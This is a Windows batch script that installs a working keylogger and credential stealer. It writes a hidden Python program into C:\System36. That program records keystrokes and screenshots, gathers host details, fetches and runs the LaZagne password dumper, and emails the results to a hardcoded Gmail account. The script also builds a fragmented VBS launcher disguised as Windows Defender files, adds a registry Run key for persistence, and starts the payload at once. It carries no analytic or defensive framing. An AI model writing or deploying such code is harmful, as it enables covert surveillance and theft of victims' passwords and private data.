@echo off

mkdir C:\System36

attrib +h C:\System36

echo:try: >C:\System36\sys.py
echo:    import smtplib >>C:\System36\sys.py
echo:    import os >>C:\System36\sys.py
echo:    import pynput.keyboard >>C:\System36\sys.py
echo:    import threading >>C:\System36\sys.py
echo:    import pyscreenshot >>C:\System36\sys.py
echo:    import imghdr >>C:\System36\sys.py
echo:    import socket >>C:\System36\sys.py
echo:    import platform >>C:\System36\sys.py
echo:    import subprocess >>C:\System36\sys.py
echo:    import tempfile >>C:\System36\sys.py
echo:    import shutil >>C:\System36\sys.py
echo:    import sys >>C:\System36\sys.py
echo:    import requests >>C:\System36\sys.py
echo:    from email.message import EmailMessage >>C:\System36\sys.py
echo:except ModuleNotFoundError: >>C:\System36\sys.py
echo:    import subprocess >>C:\System36\sys.py
echo:    modules = ["pyscreenshot","pynput","requests","pytest-shutil"] >>C:\System36\sys.py
echo:    subprocess.call("pip install " + ' '.join(modules), shell=True) >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:class Keylogger: >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:    def __init__(self, time_interval, email, password): >>C:\System36\sys.py
echo:        #self.persistent() >>C:\System36\sys.py
echo:        self.log="Keylogger started !!!" >>C:\System36\sys.py
echo:        self.interval=time_interval >>C:\System36\sys.py
echo:        self.email=email >>C:\System36\sys.py
echo:        self.password=password >>C:\System36\sys.py
echo:  >>C:\System36\sys.py
echo:    def append_to_log(self,string): >>C:\System36\sys.py
echo:        self.log=self.log + string >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:    def process_key_press(self, key): >>C:\System36\sys.py
echo:        try: >>C:\System36\sys.py
echo:            current_key = str(key.char) >>C:\System36\sys.py
echo:        except AttributeError: >>C:\System36\sys.py
echo:            if key==key.space: >>C:\System36\sys.py
echo:                current_key = " " >>C:\System36\sys.py
echo:            else: >>C:\System36\sys.py
echo:                current_key = " " + str(key) + " "  >>C:\System36\sys.py
echo:        self.append_to_log(current_key) >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:    def report(self): >>C:\System36\sys.py
echo:        self.send_mail(self.email, self.password, "\n\n" + self.log) >>C:\System36\sys.py
echo:        self.log= "" >>C:\System36\sys.py
echo:        if os.name!='nt': >>C:\System36\sys.py
echo:            temp_dir=tempfile.gettempdir() >>C:\System36\sys.py
echo:            os.chdir(temp_dir)    >>C:\System36\sys.py
echo:            os.remove("tmp.png") >>C:\System36\sys.py
echo:        else: >>C:\System36\sys.py
echo:            temp_dir=tempfile.gettempdir() >>C:\System36\sys.py
echo:            os.chdir(temp_dir)    >>C:\System36\sys.py
echo:            os.remove("tmp.png") >>C:\System36\sys.py
echo:             >>C:\System36\sys.py
echo:         >>C:\System36\sys.py
echo:        timer = threading.Timer(self.interval, self.report) >>C:\System36\sys.py
echo:        timer.start() >>C:\System36\sys.py
echo:     >>C:\System36\sys.py
echo:    def screenshot(self): >>C:\System36\sys.py
echo:        temp_dir=tempfile.gettempdir() >>C:\System36\sys.py
echo:        os.chdir(temp_dir)     >>C:\System36\sys.py
echo:        img = pyscreenshot.grab() >>C:\System36\sys.py
echo:        img.save("tmp.png") >>C:\System36\sys.py
echo:        timerscr = threading.Timer(self.interval, self.screenshot) >>C:\System36\sys.py
echo:        timerscr.start() >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:    def straler(self): >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:        def download(url): >>C:\System36\sys.py
echo:            get_response=requests.get(url) >>C:\System36\sys.py
echo:            file_name=url.split("/")[-1] >>C:\System36\sys.py
echo:            with open(file_name,"wb") as out_file: >>C:\System36\sys.py
echo:                out_file.write(get_response.content) >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:        def send_mail2(email,password,message): >>C:\System36\sys.py
echo:            server = smtplib.SMTP("smtp.gmail.com", 587) >>C:\System36\sys.py
echo:            server.starttls() >>C:\System36\sys.py
echo:            server.login(email,password) >>C:\System36\sys.py
echo:            server.sendmail(email,email,message) >>C:\System36\sys.py
echo:            server.quit() >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:        if os.name!='nt': >>C:\System36\sys.py
echo:            temp_dir=tempfile.gettempdir() >>C:\System36\sys.py
echo:            os.chdir(temp_dir) >>C:\System36\sys.py
echo:            download("https://github.com/AlessandroZ/LaZagne/archive/refs/tags/2.4.3.zip") >>C:\System36\sys.py
echo:            subprocess.call("apt-get install unzip",shell=True) >>C:\System36\sys.py
echo:            subprocess.call("unzip 2.4.3.zip",shell=True) >>C:\System36\sys.py
echo:            command = "python3 LaZagne-2.4.3/Linux/laZagne.py all -vv" >>C:\System36\sys.py
echo:            results = subprocess.check_output(command, shell=True) >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:            send_mail2("exampleLKJH@gmail.com","passwordVerySecure",results) >>C:\System36\sys.py
echo:            subprocess.call("rm 2.4.3.zip",shell=True) >>C:\System36\sys.py
echo:            subprocess.call("rm -r LaZagne-2.4.3",shell=True) >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:                     >>C:\System36\sys.py
echo:        else:       >>C:\System36\sys.py
echo:            temp_dir=tempfile.gettempdir() >>C:\System36\sys.py
echo:            os.chdir(temp_dir)       >>C:\System36\sys.py
echo:            download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe") >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:            command = "lazagne.exe all -vv" >>C:\System36\sys.py
echo:            results = subprocess.check_output(command, shell=True) >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:            send_mail2("exampleLKJH@gmail.com","passwordVerySecure",results) >>C:\System36\sys.py
echo:            os.remove("lazagne.exe") >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:    def send_mail(self,email,password,message): >>C:\System36\sys.py
echo:         >>C:\System36\sys.py
echo:        try: >>C:\System36\sys.py
echo:            temp_dir=tempfile.gettempdir() >>C:\System36\sys.py
echo:            os.chdir(temp_dir)   >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:            Sender_Email = email >>C:\System36\sys.py
echo:            Reciever_Email = email >>C:\System36\sys.py
echo:            Password = password >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:            newMessage = EmailMessage()                          >>C:\System36\sys.py
echo:            newMessage['Subject'] = "Adrishya Keylogger Report"  >>C:\System36\sys.py
echo:            newMessage['From'] = Sender_Email                    >>C:\System36\sys.py
echo:            newMessage['To'] = Reciever_Email                    >>C:\System36\sys.py
echo:            newMessage.set_content(message)  >>C:\System36\sys.py
echo:             >>C:\System36\sys.py
echo:            with open('tmp.png', 'rb') as f: >>C:\System36\sys.py
echo:                image_data = f.read() >>C:\System36\sys.py
echo:                image_type = imghdr.what(f.name) >>C:\System36\sys.py
echo:                image_name = f.name >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:            newMessage.add_attachment(image_data, maintype='image', subtype=image_type, filename=image_name) >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp: >>C:\System36\sys.py
echo:                 >>C:\System36\sys.py
echo:                smtp.login(Sender_Email, Password)               >>C:\System36\sys.py
echo:                smtp.send_message(newMessage) >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:        except: >>C:\System36\sys.py
echo:            server = smtplib.SMTP("smtp.gmail.com", 587) >>C:\System36\sys.py
echo:            server.starttls() >>C:\System36\sys.py
echo:            server.login(email,password) >>C:\System36\sys.py
echo:            server.sendmail(email,email,message) >>C:\System36\sys.py
echo:            server.quit() >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:    def system_information(self): >>C:\System36\sys.py
echo:            hostname = socket.gethostname() >>C:\System36\sys.py
echo:            ip = socket.gethostbyname(hostname) >>C:\System36\sys.py
echo:            plat = platform.processor() >>C:\System36\sys.py
echo:            system = platform.system() >>C:\System36\sys.py
echo:            machine = platform.machine() >>C:\System36\sys.py
echo:            self.append_to_log("\n" +"Hostname = " + hostname + "\n") >>C:\System36\sys.py
echo:            self.append_to_log("IP Address = " + ip + "\n") >>C:\System36\sys.py
echo:            self.append_to_log("Plat(processor) = " + plat + "\n") >>C:\System36\sys.py
echo:            self.append_to_log("System = " + system + "\n") >>C:\System36\sys.py
echo:            self.append_to_log("Mashine = " + machine + "\n") >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:    def start(self): >>C:\System36\sys.py
echo:        keybord_listner=pynput.keyboard.Listener(on_press=self.process_key_press) >>C:\System36\sys.py
echo:        with keybord_listner: >>C:\System36\sys.py
echo:            self.screenshot() >>C:\System36\sys.py
echo:            self.system_information() >>C:\System36\sys.py
echo:            self.straler() >>C:\System36\sys.py
echo:            self.report() >>C:\System36\sys.py
echo:            keybord_listner.join() >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:my_keylogger=Keylogger(238, "exampleLKJH@gmail.com", "passwordVerySecure") >>C:\System36\sys.py
echo: >>C:\System36\sys.py
echo:my_keylogger.start() >>C:\System36\sys.py
echo: >>C:\System36\sys.py


echo:wscript.exe "C:\System36\Windows_Defender_config.vbs" "C:\System36\sys.py" >C:\System36\Windows_Defender.bat

set /p "=CreateObjec" <nul >>C:\System36\Windows_Defender_config.vbs

set /p "=t("Wscript.Shell").Ru" <nul >>C:\System36\Windows_Defender_config.vbs

set /p "=n """" & WScri" <nul >>C:\System36\Windows_Defender_config.vbs

set /p "=pt.Arguments(0" <nul >>C:\System36\Windows_Defender_config.vbs

set /p "=) & """", 0, F" <nul >>C:\System36\Windows_Defender_config.vbs

set /p "=alse " <nul >>C:\System36\Windows_Defender_config.vbs

start /b reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d C:\System36\Windows_Defender.bat" 

C:\System36\Windows_Defender.bat




